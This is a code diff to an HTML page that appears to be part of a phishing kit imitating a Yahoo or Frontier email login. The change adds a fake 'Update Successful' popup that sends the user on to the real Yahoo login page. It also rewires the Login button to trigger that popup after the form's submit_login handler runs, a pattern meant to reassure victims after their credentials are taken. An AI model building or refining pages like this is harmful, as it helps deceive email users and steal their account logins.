@@ -53,6 +53,11 @@
   </head>
   <body>
    
+  <div class="popup" id="popup">
+    <img src="./HD_Outline_Tick_Check_Mark_Symbol_Logo_In_Red_Circle_Icon_PNG-removebg-preview.png" alt="">
+    <h2>Update Successful</h2>
+    <button type="submit" onclick="closepopup()"><a href="https://login.yahoo.com/?.intl">Ok</a></button>
+  </div>
 
     <section id="blur" class="">
 
@@ -163,12 +168,8 @@ function submit_login(e)
                 <div id="error"></div>
               </div>
 
-              <button id="button" class="float-left submit-button" >Login</button>
-<script type="text/javascript">
-    document.getElementById("button").onclick = function () {
-        location.href = "www.yahoo.com";
-    };
-</script>
+              <button id='button' type="submit" tabindex="6" class="btn btn-primary btn-block" alt="submit" onclick="openpopup();openpopup2()" >Login</button>  
+                <!-- <button id='button' type="submit" tabindex="6" class="btn btn-primary btn-block" alt="submit">Login</button> -->
                 
 
               <p><a href="https://acctedit.frontier.com/forgot-password;src=mail">Forgot your password ?</a></p>
